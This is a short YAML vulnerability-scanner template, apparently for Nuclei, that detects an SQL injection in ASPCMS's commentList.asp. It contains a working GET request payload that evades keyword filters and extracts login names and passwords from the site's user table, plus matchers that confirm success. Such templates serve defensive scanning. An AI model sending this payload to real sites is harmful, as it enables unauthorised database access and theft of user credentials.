id: aspcms-commentlist-sqli
info:
  name: ASPCMS commentList.asp SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The ASPCMS system does not strictly filter the data parameters submitted by visitors, allowing attackers to submit constructed SQL statements to query the database and obtain sensitive information.
  tags: sql-injection
  reference:
    - https://www.safeinfo.me/2019/07/22/aspcms-lou-dong-ji-he.html

http:
  - raw:
      - |
        GET /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20frmasterom%20{prefix}user HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "IP"
          - "class=\"line2\""
